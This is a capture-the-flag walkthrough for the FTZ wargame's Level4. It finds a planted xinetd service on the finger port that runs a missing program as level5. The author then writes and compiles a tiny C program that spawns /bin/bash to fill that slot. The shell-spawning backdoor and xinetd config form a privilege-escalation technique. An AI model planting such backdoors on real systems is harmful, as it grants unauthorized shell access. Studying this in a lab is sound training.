# Level4

## This level's goal

- xinetd
- Remote backdoor

***

`[level4@ftz level4]$ cat hint`

누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
```
[level4@ftz level4]$ ls -al /etc/xinetd.d
drwxr-xr-x    2 root     root         4096 Aug 19  2014 .
drwxr-xr-x   64 root     root         4096 Jun  4 09:31 ..
-r--r--r--    1 root     level4        171 Aug 19  2014 backdoor
-rw-r--r--    1 root     root          563 Feb 25  2003 chargen
-rw-r--r--    1 root     root          580 Feb 25  2003 chargen-udp
-rwxr-xr-x    1 root     root          239 Feb 13  2003 cups-lpd
-rw-r--r--    1 root     root          419 Feb 25  2003 daytime
-rw-r--r--    1 root     root          438 Feb 25  2003 daytime-udp
-rw-r--r--    1 root     root          341 Feb 25  2003 echo
-rw-r--r--    1 root     root          360 Feb 25  2003 echo-udp
-rw-r--r--    1 root     root          318 Jan 25  2003 finger
-rw-r--r--    1 root     root          370 Jan 25  2003 imap
-rw-r--r--    1 root     root          365 Jan 25  2003 imaps
-rw-r--r--    1 root     root          453 Jan 25  2003 ipop2
-rw-r--r--    1 root     root          359 Jan 25  2003 ipop3
-rw-r--r--    1 root     root          275 Feb  5  2003 ntalk
-rw-r--r--    1 root     root          335 Jan 25  2003 pop3s
-rw-r--r--    1 root     root          361 Jan 25  2003 rexec
-rw-r--r--    1 root     root          378 Jan 25  2003 rlogin
-rw-r--r--    1 root     root          431 Jan 25  2003 rsh
-rw-r--r--    1 root     root          317 Jan 25  2003 rsync
-rw-r--r--    1 root     root          312 Feb 25  2003 servers
-rw-r--r--    1 root     root          314 Feb 25  2003 services
-rw-r--r--    1 root     root          392 Feb  1  2003 sgi_fam
-rw-r--r--    1 root     root          263 Feb  5  2003 talk
-rw-r--r--    1 root     root          305 Aug 19  2014 telnet
-rw-r--r--    1 root     root          497 Feb 25  2003 time
-rw-r--r--    1 root     root          518 Feb 25  2003 time-udp
```

```
[level4@ftz level4]$ cat /etc/xinetd.d/backdoor
service finger
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = level5
        server          = /home/level4/tmp/backdoor
        log_on_failure  += USERID
}
```

```
[level4@ftz level4]$ cat /etc/services | grep finger
finger          79/tcp
finger          79/udp
cfinger         2003/tcp                        # GNU Finger
```

```
[level4@ftz level4]$ netstat -an | grep :79
tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN
```

```
[level4@ftz level4]$ ls -l /home/level4/tmp/backdoor
ls: /home/level4/tmp/backdoor: No such file or directory
```

```
[level4@ftz tmp]$ cat backdoor.c
#include <stdlib.h>

int main()
{
        system("/bin/bash");
        return 0;
}
[level4@ftz tmp]$ gcc -o backdoor backdoor.c
[level4@ftz tmp]$ chmod 777 backdoor
```
